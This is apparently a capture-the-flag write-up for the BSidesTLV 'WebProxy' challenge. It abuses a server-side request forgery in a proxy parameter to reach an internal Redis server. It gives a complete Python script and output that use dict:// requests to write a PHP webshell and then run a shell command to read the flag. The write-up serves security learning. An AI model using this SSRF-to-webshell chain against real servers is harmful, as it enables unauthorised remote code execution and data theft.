# WebProxy
* Category: Web
* 300 Points
* Solved by the JCTF Team

## Description
> Why I got hacked!? can you help me to close this hole?
> 
> URL: https://webproxy.ctf.bsidestlv.com/?csurl=https://stackoverflow.com/questions/8318911/why-does-html-think-chucknorris-is-a-color
> 
> Note: please include the BSidesTLV cookie


## Solution

We visit the attached website, and as expected, see the proxied webpage.

Let's see what else we can find by changing the `csurl` parameter to something a bit more interesting:
```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy# curl https://webproxy.ctf.bsidestlv.com/?csurl=http://127.0.0.1
```

As a response, we get a table with the following content:
| Service name: | IP Address: | Port: | 
| ------------- | ----------- | ----- |
| Redis | 10.42.144.38 | 6379 |
| NGINX + PHP | 10.42.144.38 | 80 |
| NGINX + PHP | 10.42.253.181 | 80 |

So, we have a Redis DB and a PHP server on the same IP! It turns out that Redis is [very forgiving](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) when it comes to accepting commands: Redis is able to ignore a good amount of "noise" and successfully execute the commands hiding inside. In our case, the "noise" is an HTTP request.

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#ssrf-exploiting-redis) has a great recipe for exploiting this:
```
# Getting a webshell
url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
url=dict://127.0.0.1:6379/SAVE
```

So basically the plan is to use the recipe above to create a webshell, and then use it to find the flag.

Here's the script:
```python
import requests

IP_ADDR = "10.42.144.38"

SHELL_NAME = 'shell.php'

def send_to_proxy(csurl):
    print(f"Sending request to: '{csurl}'")
    cookies = cookies = {'BSidesTLV': '34aa0da142bb608e2be8d1b644c25bffe6fad5a5'}
    r = requests.get(f"https://webproxy.ctf.bsidestlv.com/?csurl={csurl}", cookies = cookies)
    return r.text

commands = [
    r'CONFIG SET dir /var/www/html',
    r'CONFIG SET dbfilename {}'.format(SHELL_NAME),
    r'SET mykey "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"',
    r'SAVE'
]

for command in commands:
    csurl = f"dict://{IP_ADDR}:6379/{command}"
    send_to_proxy(csurl)

print(send_to_proxy(f"http://{IP_ADDR}:80/{SHELL_NAME}?command=cat $(find / -name flag.txt)"))

```

Output:
```console
root@kali:/media/sf_CTFs/bsidestlv/WebProxy# python3 1.py
Sending request to: 'dict://10.42.144.38:6379/CONFIG SET dir /var/www/html'
Sending request to: 'dict://10.42.144.38:6379/CONFIG SET dbfilename shell.php'
Sending request to: 'dict://10.42.144.38:6379/SET mykey2 "<\x3Fphp echo \"\\n\"; system($_GET[\'command\']); exit;\x3F>"'
Sending request to: 'dict://10.42.144.38:6379/SAVE'
Sending request to: 'http://10.42.144.38:80/shell.php?command=cat $(find / -name flag.txt)'
REDIS0006 mykey
BsidesTLV2020{55rf_Is_S0_C00l!!}
```